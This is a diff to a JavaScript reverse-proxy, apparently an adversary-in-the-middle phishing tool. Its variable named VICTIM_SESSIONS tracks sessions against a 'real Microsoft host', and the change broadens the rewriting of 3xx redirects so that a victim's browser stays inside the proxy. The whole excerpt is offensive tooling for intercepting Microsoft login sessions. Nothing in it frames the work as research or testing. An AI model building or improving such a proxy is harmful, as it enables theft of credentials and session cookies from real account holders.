@@ -454,14 +454,14 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
         // ---- REDIRECT DEBUG LOG ----
         console.log(`[REDIRECT DEBUG] isNav=${isNavigationRequest}, reqHost=${proxyRequestOptions.headers.host}, sessHost=${VICTIM_SESSIONS[currentSession].host}, status=${proxyResponse.statusCode}`);
 
-        // ---- REWRITE ALL 3xx REDIRECTS (CORS + NAVIGATION + ANY HOST) ----
+// ---- REWRITE ALL 3xx REDIRECTS ----
 if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
     const proxyResponseLocation = proxyResponse.headers.location;
     if (proxyResponseLocation) {
         try {
             const locationURL = new URL(proxyResponseLocation);
-            // Only rewrite if the Location points to the real Microsoft host
-            if (locationURL.hostname === VICTIM_SESSIONS[currentSession].hostname) {
+            // Rewrite if navigation request OR if Location points to real Microsoft host
+            if (isNavigationRequest || locationURL.hostname === VICTIM_SESSIONS[currentSession].hostname) {
                 console.log(`[REDIRECT REWRITE] Original: ${proxyResponseLocation}`);
                 // Update session with new target
                 VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
@@ -478,7 +478,7 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
             console.log(`[REDIRECT PARSE ERROR] ${error.message}`);
         }
     }
-} else if (proxyResponse.statusCode > 400) {
+}else if (proxyResponse.statusCode > 400) {
     displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
 }
 
